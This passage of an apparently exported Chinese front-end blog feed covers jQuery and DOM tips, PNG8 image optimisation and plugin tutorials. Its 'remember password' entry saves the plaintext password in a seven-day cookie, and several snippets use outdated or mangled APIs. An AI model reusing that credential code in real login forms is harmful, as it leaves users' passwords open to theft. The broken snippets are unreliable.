把图片中颜色较近或相同的组合在一起可以降低颜色数，因为少色数的图片文件体积会相对的小。&nbsp;图片优化：当我们把所有小图片都整合到一张大图中后，就要开始考虑图片优化的问题。你可以看一下现在图片的文件大小。是不是有些不尽人意呢，没关系，下面的步骤可以解决它。因为一般整合出的大图背景基本上都是全透明的，所以我们会存为png格式。大家可能会说gif比png文件大小要小，我们不是要优化吗，为什么不是gif？因为gif图片在处理圆角等曲线、或斜线的地方会出现很多锯齿，这是我们不希望看到的。而且可能会丢失一些接近于白色的小图片像素。况且我们还能找到比gif更小尺寸的格式，那就是我今天要介绍的PNG8格式。对于非动画的GIF更建议都使用PNG8因为它能做到跟原png图片一样的效果，而且能为你节省10%-30%的文件大小，甚至比gif图片还节省。&nbsp;如何将图片转成png8格式1. 图片准备：无论你是用什么绘图软件绘的图，只要按常规操作保存为png格式就可以了。photoshop中没有转png8的操作，所以我们需要求助于fireworks。2. 在fireworks中打开整合好的大图。3. 选择 文件—图像预览。4.在“格式”下拉框中选择PNG8，其他什么都不用选，直接点击“导出”按钮选择路径就可以了。很简单吧赶快看看你的png8图片的大小吧，和之前的图片对比一下。你会有惊喜的,在看看图片质量，简直是perfect~~]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>CssSprite</tag>
        <tag>图片优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery记住密码 插件的使用]]></title>
    <url>%2F2015%2F07%2F13%2Fjquery%E8%AE%B0%E4%BD%8F%E5%AF%86%E7%A0%81-%E6%8F%92%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[http://pan.baidu.com/s/1gdf1kDd最新可到jquery插件官网下载我实现时找的所有资料http://pan.baidu.com/s/1mg0pKaG【多了点jquery.cookie的API】123456789101112131415161718192021222324252627282930&lt;script type="text/javascript" src="jquery.cookie.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;$(function () &#123;$("#username").add("#password").val("");//初始化验证是否记住密码if ($.cookie("rmbUser") == "true") &#123;$("#keepPwd").prop("checked", true);//其中网上$().attr('checked')不可用 花我最多时间的就是这个$("#username").val($.cookie("userName"));$("#password").val($.cookie("passWord"));&#125;//设置cookiefunction rmbPwd()&#123;if ($("#keepPwd").prop("checked") == true) &#123;//其中网上$().attr('checked')不可用var userName = $("#username").val();var passWord = $("#password").val();$.cookie("rmbUser", "true", &#123; expires: 7 &#125;); // 存储一个带7天期限的 cookie$.cookie("userName", userName, &#123; expires: 7 &#125;); // 存储一个带7天期限的 cookie$.cookie("passWord", passWord, &#123; expires: 7 &#125;); // 存储一个带7天期限的 cookie&#125;else &#123;$.cookie("rmbUser", "false", &#123; expires: -1 &#125;);$.cookie("userName", '', &#123; expires: -1 &#125;);$.cookie("passWord", '', &#123; expires: -1 &#125;);&#125;&#125;//$("#keepPwd").click(function()&#123;rmbPwd();&#125;);&lt;/script&gt;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jq记住密码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[层级元素含有position属性时鼠标坐标位置解决方案]]></title>
    <url>%2F2015%2F07%2F13%2F%E5%B1%82%E7%BA%A7%E5%85%83%E7%B4%A0%E5%90%AB%E6%9C%89position%E5%B1%9E%E6%80%A7%E6%97%B6%E9%BC%A0%E6%A0%87%E5%9D%90%E6%A0%87%E4%BD%8D%E7%BD%AE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;相信熟悉javascript的朋友对鼠标坐标函数比较了解的，网上的资料也很多，就不多说了。先看看一段代码：123456jQuery(document).ready(function()&#123;$('#demos').mousemove(function(e)&#123;var relX = e.pageX - this.offsetLeftvar relY = e.pageY - this.offsetTop$('#demos').html(relX + '， ' + relY);&#125;);层级元素含有position属性&emsp;&emsp;在这里我们要重点说下offsetLeft的计算方法，上面也说到是对象相对于父级对象的布局或坐标的left值，那么父级对象将是影响最终值的关键。一般情况下，都没什么问题，但如果父级对象出现了position属性，并且定义了margin值，那么计算结果将会不如我们所意。这是个特殊情况，在这时我们需要适当的修改上面的示例代码，具体如下：12345678jQuery(document).ready(function()&#123;$('#demos').mousemove(function(e)&#123;var parentOffset = $(this).parent().offset();var relX = e.pageX - parentOffset.left;var relY = e.pageY - parentOffset.top;$('#demos').html(relX + '， ' + relY);&#125;);&#125;)]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>position层级</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JQuery中append和appendTo的，及js中的appendChild、insertBefore 讲解]]></title>
    <url>%2F2015%2F07%2F13%2Fjquery%E4%B8%ADappend%E5%92%8Cappendto%E7%9A%84%EF%BC%8C%E5%8F%8Ajs%E4%B8%AD%E7%9A%84appendchild%E3%80%81insertbefore-%E8%AE%B2%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[append和appendTo的区别append()前面是要选择的对象，后面是要在对象内插入的元素内容appendTo()前面是要插入的元素内容且为Jquery对象，而后面是要选择的对象实例：12$('#a').append('**content**');$('**&lt;div&gt;content&lt;/div&gt;**').appendTo($('#a'));注意appendTo前面一定要是Jquery对象。appendChild、insertBefore的用法appendChild 学过的都知道，appendChild() 方法可向节点的子节点列表的末尾添加新的子节点。如果对它理解不深，经常会犯一些错误。我以前就是哈哈。下面我们来分析一下。1234var myDiv = document.createElement_x("div");var text = document.createTextNode("sichaoyun");myDiv.appendChild(text);alert(myDiv.childNodes[0].nodeValue);text 就会添加到div节点里面。我们用的时候一定要注意，text一定要是节点。不能直接添加内容或数组里面的内容。arr = ["si","chaoyun"];```123456789比如：myDiv.appendChild(arr[0]); 就会出错。必须把节点添加到数组里面 才可以用appendChild.```javascriptvar arr=[];arr[0]=document.createTextNode(&quot;si&quot;);arr[1]=document.createTextNode(&quot;chaoyun&quot;);myDiv.appendChild(arr[0]);这样就ok啦。这样添加的是节点。appendChild另一个需要注意的就是它会删除源节点。来看下面这个demo。12345var str1=document.createElement_x('div');str1.innerHTML="&lt;span&gt;1&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;";alert(str1.childNodes.length); //2document.getElementByIdx_x('mydiv').appendChild(str1.childNodes[0]);alert(str1.childNodes.length); //1str1里面的1添加到mydiv里面之后str1里面的span已经不存在了。你可以理解为是移动到mydiv里面。所以第二个会弹出1.另外insertBefore也是会删除源节点。来看下面这个例子：123456789var src = document.createElement_x("div");src.innerHTML = "&lt;span&gt;1&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;";var dest = document.createElement_x("div");dest.innerHTML = "&lt;span&gt;3&lt;/span&gt;";for (var i = 0; i&lt; src.childNodes.length; i++)&#123;dest.insertBefore(src.childNodes[i], dest.childNodes[0]);&#125;alert(dest.childNodes.length);看看 alert 会显示几？按常理，dest 本来有一个节点，再加上 src 的两个，应该是三个才对，可是结果却是 2。原因是使用 insertBefore 后，src 对应的子节点已经被删除，或者说已经被移动到 dest，要解决，有两种方法。使用 while 循环可以解决这个问题1234567891011&lt;script type="text/javascript"&gt;var src = document.createElement_x("div");src.innerHTML = "&lt;span&gt;1&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;";var dest = document.createElement_x("div");dest.innerHTML = "&lt;span&gt;3&lt;/span&gt;";while (src.childNodes.length &gt; 0)&#123;dest.insertBefore(src.childNodes[0], dest.childNodes[0]);&#125;alert(dest.childNodes.length);&lt;/script&gt;appendChild(Node)这个 方法一般是在指定元素节点的最后一个子节点之后添加节点但如果Node是页面中的DOM对象，那么就不是添加节点了，就是直接Move节点。appendChild你可以理解为移动一个元素。如果想复制一份过去，要事先clone]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>appendChild</tag>
        <tag>append</tag>
        <tag>appendTo</tag>
        <tag>insertBefore</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery中的ready与onload的区别]]></title>
    <url>%2F2015%2F07%2F13%2Fjquery%E4%B8%AD%E7%9A%84ready%E4%B8%8Eonload%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[Jquery中的$(document).ready()(也可简写为$().ready())方法与javascirpt本身提供的window.onload() 都可以在DOM载入就绪时操作并调用执行它所绑定的函数。在实际使用中它们还是存在细微的区别的，window.onload()方法是在网页上所有的元素（包括元素的所有关联文件）完全加载到浏览器后才执行，即javascript此时才可以访问网页上的所有元素。而通过jquery中的$().ready()方法注册的事件处理程序，在DOM完全就绪的时候就可以被调用。此时网页上的所有元素都是可以被访问的，但是，这并不意味着网页上所有元素关联的文件都已经下载完毕！通过这样细微的差别可以看出jquery提供的$().ready()可以很好的提高web相应效率。但有时也存在一些弊端，比如在HTML文件中嵌入一个SVG文件，这样你无法在$().ready()中访问SVG文件中的元素，因为SVG文件在DOM加载完成时可能还没有被下载下来，s这样只能用Jquery提供的$(window).load()方法代替，$(window).load()与window.onload()是同样的效果！]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>onload</tag>
        <tag>ready</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[右下角pop弹窗 完美兼容ie6789 ff chrome，类似discuz右下角]]></title>
    <url>%2F2015%2F07%2F13%2F%E5%8F%B3%E4%B8%8B%E8%A7%92pop%E5%BC%B9%E7%AA%97-%E5%AE%8C%E7%BE%8E%E5%85%BC%E5%AE%B9ie6789-ff-chrome%EF%BC%8C%E7%B1%BB%E4%BC%BCdiscuz%E5%8F%B3%E4%B8%8B%E8%A7%92%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;网上找了很多，感觉不好用或者有问题，自己写一个以备后用：类似discuz右下角消息提示框主要是用css position的fixed属性，但是ie6不支持此属性，通过jquery.fixed.js插件实现兼容效果如下：Demo演示点此下载调用方法非常简单123456&lt;script type="text/javascript"&gt;//记得加载jquery//使用参数：1.标题，2.链接地址，3.内容简介window.onload=function()&#123; var pop=new Pop("这里是标题，哈哈","http://www.js7e.com/","请输入你的内容简介，这里是内容简介.请输入你的内容简介，这里是内容简介.请输入你的内容简介，这里是内容简介");&lt;/script&gt;自己去下载来试一下吧 哈哈]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>pop弹窗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JQuery获取某元素的的坐标]]></title>
    <url>%2F2015%2F07%2F13%2Fjquery%E8%8E%B7%E5%8F%96%E6%9F%90%E5%85%83%E7%B4%A0%E7%9A%84%E7%9A%84%E5%9D%90%E6%A0%87%2F</url>
    <content type="text"><![CDATA[获取页面某一元素的绝对X,Y坐标，可以用offset()方法：（body属性设置margin :0;padding:0;）var X = $(‘#DivID’).offset().top;var Y = $(‘#DivID’).offset().left;//获取相对(父元素)位置:var X = $(‘#DivID’).position().top;var Y = $(‘#DivID’).position().left;比如我下面做的这个效果，按个小三角行跟着按钮点击的位置就是需要用到获取坐标值的方法。12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;title&gt;java Test&lt;/title&gt;&lt;/head&gt;&lt;style type="text/css"&gt;&lt;!--body,div &#123; margin:0; padding:0;&#125;--&gt;&lt;/style&gt;&lt;script type="text/javascript" src="js/jquery.js"&gt;&lt;/script&gt;&lt;body&gt;&lt;div style="background:#ccc;height:300px;" onclick=""&gt;&lt;/div&gt;&lt;div style="position:relative;"&gt;&lt;div style=" position:absolute;left:50px; top:50px;" id="DivID"&gt;&lt;/div&gt;&lt;/div&gt;&lt;script type="text/javascript"&gt;var X = $('#DivID').offset().top;var Y = $('#DivID').offset().left;document.write(X+"");document.write(Y+"");//获取相对(父元素)位置:var C = $('#DivID').position().top;var D = $('#DivID').position().left;document.write(C+"");document.write(D);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>获取坐标</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery的一些技巧总结]]></title>
    <url>%2F2015%2F07%2F13%2Fjquery%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[1、使用方法在需要使用JQuery的页面中引入JQuery的js文件即可。例如：引入之后便可在页面的任意地方使用jQuery提供的语法。2、学习教程及参考资料请参照《jQuery中文API手册》和http://jquery.org.cn/visual/cn/index.xml推荐两篇不错的jquery教程：《jQuery的起点教程》和《使用 jQuery 简化 Ajax 开发》(说明：以上文档都放在了【附件】中)3、语法总结和注意事项1、关于页面元素的引用通过jquery的$()引用元素包括通过id、class、元素名以及元素的层级关系及dom或者xpath条件等方法，且返回的对象为jquery对象（集合对象），不能直接调用dom定义的方法。2、jQuery对象与dom对象的转换只有jquery对象才能使用jquery定义的方法。注意dom对象和jquery对象是有区别的，调用方法时要注意操作的是dom对象还是jquery对象。普通的dom对象一般可以通过$()转换成jquery对象。如：$(document.getElementById(“msg”))则为jquery对象，可以使用jquery的方法。由于jquery对象本身是一个集合。所以如果jquery对象要转换为dom对象则必须取出其中的某一项，一般可通过索引取出。如：$(“#msg”)[0]，$(“div”).eq(1)[0]，$(“div”).get()[1]，$(“td”)[5]这些都是dom对象，可以使用dom中的方法，但不能再使用Jquery的方法。以下几种写法都是正确的：$(“#msg”).html();$(“#msg”)[0].innerHTML;$(“#msg”).eq(0)[0].innerHTML;$(“#msg”).get(0).innerHTML;3、如何获取jQuery集合的某一项对于获取的元素集合，获取其中的某一项（通过索引指定）可以使用eq或get(n)方法或者索引号获取，要注意，eq返回的是jquery对象，而get (n)和索引返回的是dom元素对象。对于jquery对象只能使用jquery的方法，而dom对象只能使用dom的方法，如要获取第三个&lt; div&gt;元素的内容。有如下两种方法：$(“div”).eq(2).html(); //调用jquery对象的方法$(“div”).get(2).innerHTML; //调用dom的方法属性4、同一函数实现set和getJquery中的很多方法都是如此，主要包括如下几个：$(“#msg”).html(); //返回id为msg的元素节点的html内容。$(“#msg”).html(“new content”);//将“new content”作为html串写入id为msg的元素节点内容中,页面显示粗体的new content$(“#msg”).text(); //返回id为msg的元素节点的文本内容。$(“#msg”).text(“new content”);//将“new content”作为普通文本串写入id为msg的元素节点内容中,页面显示粗体的new content$(“#msg”).height(); //返回id为msg的元素的高度$(“#msg”).height(“300”); //将id为msg的元素的高度设为300$(“#msg”).width(); //返回id为msg的元素的宽度$(“#msg”).width(“300”); //将id为msg的元素的宽度设为300$(“input”).val(“); //返回表单输入框的value值$(“input”).val(“test”); //将表单输入框的value值设为test$(“#msg”).click(); //触发id为msg的元素的单击事件$(“#msg”).click(fn); //为id为msg的元素单击事件添加函数同样blur,focus,select,submit事件都可以有着两种调用方法4、集合处理功能对于jquery返回的集合内容无需我们自己循环遍历并对每个对象分别做处理，jquery已经为我们提供的很方便的方法进行集合的处理。包括两种形式：$(“p”).each(function(i){this.style.color=[‘#f00’,’#0f0’,’#00f’]})//为索引分别为0，1，2的p元素分别设定不同的字体颜色。$(“tr”).each(function(i){this.style.backgroundColor=[‘#ccc’,’#fff’][i%2]})//实现表格的隔行换色效果$(“p”).click(function(){alert($(this).html())}) //为每个p元素增加了click事件，单击某个p元素则弹出其内容5、扩展我们需要的功能1234$.extend(&#123; min: function(a, b)&#123;return a &lt; b?a:b; &#125;, max: function(a, b)&#123;return a &gt; b?a:b; &#125;&#125;); //为jquery扩展了min,max两个方法使用扩展的方法（通过“$.方法名”调用）：alert(“a=10,b=20,max=”+$.max(10,20)+”,min=”+$.min(10,20));6、支持方法的连写所谓连写，即可以对一个jquery对象连续调用各种不同的方法。例如：123$("p").click(function()&#123;alert($(this).html())&#125;).mouseover(function()&#123;alert('mouse over event')&#125;).each(function(i)&#123;this.style.color=['#f00','#0f0','#00f']&#125;);7、操作元素的样式主要包括以下几种方式：$(“#msg”).css(“background”); //返回元素的背景颜色$(“#msg”).css(“background”,”#ccc”) //设定元素背景为灰色$(“#msg”).height(300); $(“#msg”).width(“200”); //设定宽高$(“#msg”).css({ color: “red”, background: “blue” });//以名值对的形式设定样式$(“#msg”).addClass(“select”); //为元素增加名称为select的class$(“#msg”).removeClass(“select”); //删除元素名称为select的class$(“#msg”).toggleClass(“select”); //如果存在（不存在）就删除（添加）名称为select的class8、完善的事件处理功能Jquery已经为我们提供了各种事件处理方法，我们无需在html元素上直接写事件，而可以直接为通过jquery获取的对象添加事件。如：$(“#msg”).click(function(){alert(“good”)}) //为元素添加了单击事件$(“p”).click(function(i){this.style.color=[‘#f00’,’#0f0’,’#00f’]})//为三个不同的p元素单击事件分别设定不同的处理jQuery中几个自定义的事件：（1）hover(fn1,fn2)：一个模仿悬停事件（鼠标移动到一个对象上面及移出这个对象）的方法。当鼠标移动到一个匹配的元素上面时，会触发指定的第一个函数。当鼠标移出这个元素时，会触发指定的第二个函数。//当鼠标放在表格的某行上时将class置为over，离开时置为out。123456$("tr").hover(function()&#123;$(this).addClass("over");&#125;, function()&#123; $(this).addClass("out");&#125;);（2）ready(fn):当DOM载入就绪可以查询及操纵时绑定一个要执行的函数。$(document).ready(function(){alert(“Load Success”)})//页面加载完毕提示“Load Success”,相当于onload事件。与$(fn)等价（3）toggle(evenFn,oddFn): 每次点击时切换要调用的函数。如果点击了一个匹配的元素，则触发指定的第一个函数，当再次点击同一元素时，则触发指定的第二个函数。随后的每次点击都重复对这两个函数的轮番调用。123456//每次点击时轮换添加和删除名为selected的class。$("p").toggle(function()&#123; $(this).addClass("selected"); &#125;,function()&#123; $(this).removeClass("selected");&#125;);（4）trigger(eventtype): 在每一个匹配的元素上触发某类事件。例如：$(&quot;p&quot;).trigger(&quot;click&quot;); //触发所有p元素的click事件 （5）bind(eventtype,fn)，unbind(eventtype):事件的绑定与反绑定从每一个匹配的元素中（添加）删除绑定的事件。例如：123$("p").bind("click", function()&#123;alert($(this).text());&#125;); //为每个p元素添加单击事件$("p").unbind(); //删除所有p元素上的所有事件$("p").unbind("click") //删除所有p元素上的单击事件8、几个实用特效功能其中toggle()和slidetoggle()方法提供了状态切换功能。如toggle()方法包括了hide()和show()方法。slideToggle()方法包括了slideDown()和slideUp方法。10、几个有用的jQuery方法$.browser.浏览器类型：检测浏览器类型。有效参数：safari, opera, msie, mozilla。如检测是否ie：$.browser.isie，是ie浏览器则返回true。$.each(obj, fn)：通用的迭代函数。可用于近似地迭代对象和数组（代替循环）。如$.each( [0,1,2], function(i, n){ alert( “Item #” + i + “: “ + n ); });等价于：1234var tempArr=[0,1,2];for(var i=0;i alert("Item #"+i+": "+tempArr);&#125;也可以处理json数据，如1$.each( &#123; name: "John", lang: "JS" &#125;, function(i, n)&#123; alert( "Name: " + i + ", Value: " + n ); &#125;);结果为：Name:name, Value:JohnName:lang, Value:JS$.extend(target,prop1,propN)：用一个或多个其他对象来扩展一个对象，返回这个被扩展的对象。这是jquery实现的继承方式。如：$.extend(settings, options);//合并settings和options，并将合并结果返回settings中，相当于options继承setting并将继承结果保存在setting中。var settings = $.extend({}, defaults, options);//合并defaults和options，并将合并结果返回到setting中而不覆盖default内容。可以有多个参数（合并多项并返回）$.map(array, fn)：数组映射。把一个数组中的项目(处理转换后)保存到到另一个新数组中，并返回生成的新数组。如：var tempArr=$.map( [0,1,2], function(i){ return i + 4; });tempArr内容为：[4,5,6]var tempArr=$.map( [0,1,2], function(i){ return i &gt; 0 ? i + 1 : null; });tempArr内容为：[2,3]$.merge(arr1,arr2):合并两个数组并删除其中重复的项目。如：$.merge( [0,1,2], [2,3,4] ) //返回[0,1,2,3,4]$.trim(str)：删除字符串两端的空白字符。如：$.trim(“ hello, how are you? “); //返回”hello,how are you? “11、解决自定义方法或其他类库与jQuery的冲突很多时候我们自己定义了$(id)方法来获取一个元素，或者其他的一些js类库如prototype也都定义了$方法，如果同时把这些内容放在一起就会引起变量方法定义冲突，Jquery对此专门提供了方法用于解决此问题。使用jquery中的jQuery.noConflict();方法即可把变量$的控制权让渡给第一个实现它的那个库或之前自定义的$方法。之后应用 Jquery的时候只要将所有的$换成jQuery即可，如原来引用对象方法$(“#msg”)改为jQuery(“#msg”)。如：12345jQuery.noConflict();// 开始使用jQueryjQuery("div p").hide();// 使用其他库的 $()$("content").style.display = 'none';]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jqurey操作select 语法解释]]></title>
    <url>%2F2015%2F07%2F13%2Fjqurey%E6%93%8D%E4%BD%9Cselect-%E8%AF%AD%E6%B3%95%E8%A7%A3%E9%87%8A%2F</url>
    <content type="text"><![CDATA[jQuery获取Select选择的Text和Value:语法解释：1. $(“#selectId”).change(function(){ … }); //为Select添加事件，当选择其中一项时触发2. var checkText=$(“#selectId”).find(“option:selected”).text(); //获取Select选择的Text3. var checkValue=$(“#selectId”).val(); //获取Select选择的Value4. var checkIndex=$(“#selectId “).get(0).selectedIndex; //获取Select选择的索引值5. var maxIndex=$(“#selectId option:last”).attr(“index”); //获取Select最大的索引值jQuery设置Select选择的 Text和Value:语法解释：1. $(“#selectId “).get(0).selectedIndex=1; //设置Select索引值为1的项选中2. $(“#selectId “).val(4); // 设置Select的Value值为4的项选中3. $(“#selectId option[text=jQuery]”).attr(“selected”, true); //设置Select的Text值为jQuery的项选中jQuery添加/删除Select的Option项：语法解释：1. $(“#selectId”).append(“Text“); //为Select追加一个Option(下拉项)2. $(“#selectId”).prepend(“请选择“); //为Select插入一个Option(第一个位置)3. $(“#selectId option:last”).remove(); //删除Select中索引值最大Option(最后一个)4. $(“#selectId option[index=’0’]”).remove(); //删除Select中索引值为0的Option(第一个)5. $(“#selectId option[value=’1’]”).remove(); //删除Select中Value=’1’的Option6. $(“#selectId option[text=’2’]”).remove(); //删除Select中Text=’2’的Option]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>select语法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何编写一个jQuery插件]]></title>
    <url>%2F2015%2F07%2F13%2F%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAjquery%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[创建一个jQuery功能12345jQuery.fn.myFunction = function()&#123; return this.each(function()&#123; // 特定于元素的代码在这里 &#125;);&#125;;例子12345678jQuery.fn.makeTextRed = function()&#123; return this.each(function()&#123; $(this).css('color', 'red'); &#125;);&#125;;// Example usage$('#my-div').makeTextRed(); // make text in "my-div" red$('p').makeTextRed(); // 让所有段落红创建一个jQuery的方法例子12345jQuery.sayHelloWorld = function（）&#123;alert('Hello World');&#125; ;//使用示例$.sayHelloWorld(); // alerts "Hello World"选项你的插件的灵活和用户友好尽可能使用选项。扩大（）方法将两个或多个对象作为参数，并合并它们的含量在第一个对象。例子一个函数，设置文本颜色（默认为红色）。12345678910jQuery.fn.makeTextColored = function(settings)&#123;var config = &#123;'color': 'red'&#125;;if (settings)&#123;$.extend(config, settings);&#125;return this.each(function()&#123;$(this).css('color', config.color);&#125;);&#125;;现在，我们可以选择通过设置参数或不使用此功能。12$('#my-div').makeTextColored(); // 使文本红(默认)$('#my-div').makeTextColored('blue');//使文本蓝色兼容性由于变量可能会使用其他插件，使用别名技术，使您的插件向前兼容。1234567(function($)&#123;$.fn.myFunction = function() &#123;return this.each(function() &#123;// 特定于元素的代码在这里&#125;);&#125;;&#125;)(jQuery);&emsp;&emsp;我们传递的功能，现在可以使用我们喜欢的任何别名为jQuery jQuery的。因此，而不是美元，你也可以使用任何其他有效的JavaScript变量名。jQuery插件清单这是一个重要的点开发一个jQuery插件（从jQuery.com）的时要记住。[插入插件的名称。JS，例如将文件命名为jQuery的。jquery.debug.js连接到jQuery.fn对象，jQuery对象的所有功能，所有新的方法。里面的方法，这是当前jQuery对象的引用。&emsp;&emsp;你附加的任何方法或函数必须有一​​个分号（;)结束“，否则压缩的代码时，将打破。&emsp;&emsp;您的方法必须返回jQuery对象，除非明确地指出，否则。使用this.each来遍历当前匹配的元素集合。务必将插件jQuery的，而不是美元，所以通过noConflict（），用户可以使用一个自定义的别名。jQuery插件模板这是两个很好的的代码模板开始开发jQuery插件时。函数模板1234567891011(function($)&#123;$.fn.myPlugin = function(settings)&#123;var config = &#123;'foo': 'bar'&#125;;if (settings)&#123;$.extend(config, settings);&#125;return this.each(function()&#123;// 特定于元素的代码在这里&#125;);&#125;;&#125;)(jQuery);方法模板12345678910(function($)&#123;$.myPlugin = function(settings)&#123;var config = &#123;'foo': 'bar'&#125;;if (settings)&#123;$.extend(config, settings);&#125;// 代码在这里return this;&#125;;&#125;)(jQuery);例如：jQuery的幻灯片插件&emsp;&emsp;我选择了使用非常简单的例子，到目前为止，为了让您开始浏览网页。下面的例子是一个比较复杂，可能有助于让您的灵感。它使用setInterval（）的函数的一个HTML元素的组合与jQuery效果淡出（）和淡入（）周期的任意数量的图像内。在setUpHTML12345&lt;div id="slideshow"&gt;&lt;img src="img/sample-image-1.png" alt="" /&gt;&lt;img src="img/sample-image-2.png" alt="" /&gt;&lt;img src="img/sample-image-3.png" alt="" /&gt;&lt;img src="img/sample-image-4.png" alt="" /&gt;CSS1234#slideshow img &#123;display: none;position: absolute;&#125;使用Javascript1234567891011121314151617181920212223242526(function($)&#123;$.simpleSlideShow = function(selector, settings)&#123;// 设置var config = &#123;'delay': 2000,'fadeSpeed': 500&#125;;if ( settings )&#123;$.extend(config, settings);&#125;// 变量var obj = $(selector);var img = obj.children('img');var count = img.length;var i = 0;// 显示第一个图像img.eq(0).show();// 运行幻灯片setInterval(function()&#123;img.eq(i).fadeOut(config.fadeSpeed);i = ( i+1 == count ) ? 0 : i+1;img.eq(i).fadeIn(config.fadeSpeed);&#125;, config.delay);return this;&#125;;&#125;)(jQuery);用法为了使幻灯片上的＃幻灯片的 div，我们只需调用它使用下面的JavaScript代码：123&lt;script type="text/javascript"&gt;$.simpleSlideShow('#slideshow');&lt;/script&gt;&emsp;&emsp;因为我们允许设置来改变行为的幻灯片,我们可以让它等待5秒钟图像之间和设置“渐”持续到200 ms使用:123&lt;script type="text/javascript"&gt;$.simpleSlideShow('#slideshow', &#123;'delay':5000, 'fadeSpeed': 200&#125;);&lt;/script&gt;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>编写插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图片滑动翻牌效果(jQuery)]]></title>
    <url>%2F2015%2F07%2F13%2F%E5%9B%BE%E7%89%87%E6%BB%91%E5%8A%A8%E7%BF%BB%E7%89%8C%E6%95%88%E6%9E%9Cjquery%2F</url>
    <content type="text"><![CDATA[使用方法：1.引用样式文件css/lrtk.css2.引用jquery的库文件js/jquery.js3.引用效果的具体js代码文件js/js.js复制至html文件中。4.将class为box的ul的内容复制到您的html文件Demo演示点此下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>图片滑动</tag>
        <tag>图片翻牌</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[仿淘宝回顶部和建议代码(jQuery)]]></title>
    <url>%2F2015%2F07%2F13%2F%E4%BB%BF%E6%B7%98%E5%AE%9D%E5%9B%9E%E9%A1%B6%E9%83%A8%E5%92%8C%E5%BB%BA%E8%AE%AE%E4%BB%A3%E7%A0%81jquery%2F</url>
    <content type="text"><![CDATA[仿淘宝回顶部和建议代码(jQuery)，web前沿推荐下载！使用方法：1.引用样式文件css/lrtk.css2.引用jquery的库文件js/jquery.js3.引用效果的具体js代码文件js/js.js复制至html文件中4.将id为tbox的div的内容复制到您的html文件5.具体详细设置在css和js中都有注释Demo演示点此下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>返回顶部</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二十一种切换方式的jquery幻灯片]]></title>
    <url>%2F2015%2F07%2F13%2F%E4%BA%8C%E5%8D%81%E4%B8%80%E7%A7%8D%E5%88%87%E6%8D%A2%E6%96%B9%E5%BC%8F%E7%9A%84jquery%E5%B9%BB%E7%81%AF%E7%89%87%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;这个幻灯片效果堪称经典，支持二十一种幻灯片效果，支持字幕嵌入切换！支持全屏，修改效果也很方便。基本可以满足你想要的幻灯片切换方式~点此下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jq幻灯片</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用jquery自制弹出层效果，自适应浏览器]]></title>
    <url>%2F2015%2F07%2F13%2F%E7%94%A8jquery%E8%87%AA%E5%88%B6%E5%BC%B9%E5%87%BA%E5%B1%82%E6%95%88%E6%9E%9C%EF%BC%8C%E8%87%AA%E9%80%82%E5%BA%94%E6%B5%8F%E8%A7%88%E5%99%A8%2F</url>
    <content type="text"><![CDATA[效果演示：&nbsp;Demo演示 点此下载&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>jq弹出层</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[完美解决IE6不支持hover的方法]]></title>
    <url>%2F2015%2F07%2F13%2F%E5%AE%8C%E7%BE%8E%E8%A7%A3%E5%86%B3ie6%E4%B8%8D%E6%94%AF%E6%8C%81hover%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
